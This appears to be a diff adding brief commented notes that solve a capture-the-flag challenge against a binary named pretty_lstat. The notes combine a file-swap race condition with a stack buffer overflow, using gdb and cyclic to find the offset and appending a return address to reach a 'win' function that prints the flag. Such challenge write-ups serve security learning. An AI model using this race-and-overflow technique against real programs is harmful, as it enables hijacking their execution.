@@ -1,0 +1,12 @@
+# Create a script that will change the name of three files. 
+# while true; do cp hello.txt data.txt; cp exploit.txt data.txt; done
+# Run it and run the program with data.txt as argument (or the name file that will be repleced)
+
+# Or use gdb with the normal data. Put a breakpoint after the stack for the file has been allocated. 
+# Copy the content of exploit file in prevoius file and overflow.
+# cp exploit.txt data.txt while on breakpoint
+# use cyclic to find the overflow and remove the extra bytes (looking the overflow from gdb)
+# Then echo -ne "\x96\x12\x40\x00\x00\x00\x00\x00" >> exploit.txt and xxd exploit.txt
+# This will execute the win function and print the flag
+# while true;do ./pretty_lstat data.txt; done to execute the program 
+# and then use the initila script in different terminal
